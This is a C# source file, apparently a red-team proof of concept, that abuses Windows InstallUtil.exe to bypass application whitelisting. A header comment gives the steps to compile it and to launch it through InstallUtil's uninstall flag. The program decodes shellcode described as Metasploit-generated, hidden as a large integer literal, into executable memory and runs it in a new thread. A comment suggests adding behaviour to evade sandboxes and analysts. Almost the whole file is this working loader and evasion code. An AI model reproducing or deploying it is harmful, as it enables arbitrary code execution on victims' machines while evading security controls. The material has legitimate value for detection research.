sing System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
 
 
  
/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Step One:
 
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /unsafe /platform:x86 /reference:System.Numerics.dll /out:execcalc.exe execcalc.cs
Step Two:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U execcalc.exe
 
*/
  

    public class Program
    {
        public static void Main()
        {
            Console.WriteLine("Hello From Main...I Don't Do Anything");
            //Add any behaviour here to throw off sandbox execution/analysts :)
            Shellcode.Exec();
        }
         
    }
     
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
{
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
     
        Console.WriteLine("Hello There From Uninstall");
        Shellcode.Exec();
         
    }
     
}
 
     
    public class Shellcode
{
        public static void Exec()
        {
            // native function's compiled code
            // generated with metasploit
            System.Numerics.BigInteger bg = System.Numerics.BigInteger.Parse("955371524831662197453050296989540772601133427792513134757189266616055384522946738068444826002778254097458315402936617690208840499932509451279479554640594402871266365115513740485971485248101715397142585956356308065098484068968551033809964658612307231583273422172635492824235484138467774562003547949892861997720988693254164818175579102162132480725647317133826087560793254169417751150810377439126410560769908926737138539475769692348604671207525047549002006057380092");
			byte[] shellcode = bg.ToByteArray();	
			
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data
  
  
            IntPtr pinfo = IntPtr.Zero;
  
            // execute native code
  
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
             
      }
  
        private static UInt32 MEM_COMMIT = 0x1000;
  
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
 
        [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
         UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
 
     
 
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(
 
      UInt32 lpThreadAttributes,
      UInt32 dwStackSize,
      UInt32 lpStartAddress,
      IntPtr param,
      UInt32 dwCreationFlags,
      ref UInt32 lpThreadId
 
      );
    [DllImport("kernel32")]
    private static extern bool CloseHandle(IntPtr handle);
 
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(
 
      IntPtr hHandle,
      UInt32 dwMilliseconds
      );
     
         
  
}